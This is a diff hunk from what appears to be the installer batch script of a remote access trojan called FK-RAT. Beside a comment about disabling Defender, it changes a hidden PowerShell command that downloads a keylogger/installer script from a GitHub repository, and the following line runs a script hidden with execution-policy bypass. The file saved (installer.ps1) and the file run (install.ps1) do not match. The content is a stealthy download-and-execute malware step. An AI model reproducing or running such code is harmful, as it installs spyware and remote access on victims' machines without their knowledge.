@@ -33,5 +33,5 @@ REM diable defender
 
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/Sunnickel/FK-RAT/raw/main/resources/keylogger-pwsh/keylogger.ps1 -OutFile install.ps1"; 
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1"; 
 powershell Start-Process -windowstyle hidden -ep bypass "install.ps1"
